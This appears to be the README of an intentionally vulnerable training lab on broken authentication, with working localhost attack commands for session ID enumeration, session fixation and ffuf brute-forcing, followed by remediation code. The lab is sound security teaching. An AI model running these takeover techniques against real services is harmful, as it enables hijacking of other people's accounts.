# Lab 07 — Broken Auth: Predictable Sessions + Session Fixation 🔴

**Port:** `8007`  
**Stack:** Node.js + Redis  
**Difficulty:** Beginner–Intermediate

---

## 🕳️ Security Loopholes

1. **Predictable Session IDs** — Sessions use sequential counters: `sess-1001`, `sess-1002`…
2. **Session Fixation** — `/set-session` lets attackers pre-plant a session ID then trick a victim into authenticating with it
3. **No Session Invalidation on Logout**
4. **Redis session store accessible without auth** (see Lab 19 for full Redis exposure)

---

## 🎯 Attack Scenarios

### Scenario A — Session Enumeration
```bash
docker compose up -d

# Login to get your own session
MY_SESS=$(curl -s -X POST http://localhost:8007/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"bob123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['session_id'])")
echo "My session: $MY_SESS"

# Enumerate other sessions (admin's is sess-1001)
for i in $(seq 1000 1020); do
  result=$(curl -s http://localhost:8007/profile -H "X-Session-Id: sess-$i")
  if echo "$result" | grep -q '"username"'; then
    echo "Found valid session sess-$i: $result"
  fi
done

# Hit admin endpoint with stolen session
curl http://localhost:8007/admin/data -H "X-Session-Id: sess-1001"
```

### Scenario B — Session Fixation Attack
```bash
# Step 1: Attacker plants a known session ID before victim logs in
curl -X POST http://localhost:8007/set-session \
  -H "Content-Type: application/json" \
  -d '{"session_id":"attacker-controlled-sess", "username":"placeholder"}'

# Step 2: Attacker sends victim a link that uses this session
# e.g. http://localhost:8007/auto-login?sid=attacker-controlled-sess

# Step 3: Victim logs in (session is now bound to attacker's known ID)
# Step 4: Attacker uses the same session ID to access victim's account
curl http://localhost:8007/profile -H "X-Session-Id: attacker-controlled-sess"
```

### Scenario C — Brute Force with ffuf
```bash
# Generate session ID wordlist
python3 -c "
for i in range(1000, 1100):
    print(f'sess-{i}')
" > sessions.txt

# Fuzz with ffuf
ffuf -u http://localhost:8007/profile \
  -H "X-Session-Id: FUZZ" \
  -w sessions.txt \
  -mc 200 \
  -t 10
```

---

## 🔐 How to Fix

```javascript
const crypto = require('crypto');

// Generate cryptographically random session IDs
const sessionId = crypto.randomBytes(32).toString('hex'); // 256-bit entropy

// Never accept client-supplied session IDs
// Remove the /set-session endpoint entirely

// Regenerate session ID after login (prevent fixation)
await redis.del(oldSessionId);
const newSessionId = crypto.randomBytes(32).toString('hex');
await redis.set(newSessionId, userData, { EX: 3600 });

// Add secure flags when using cookies
res.cookie('sid', sessionId, { httpOnly: true, secure: true, sameSite: 'strict' });
```
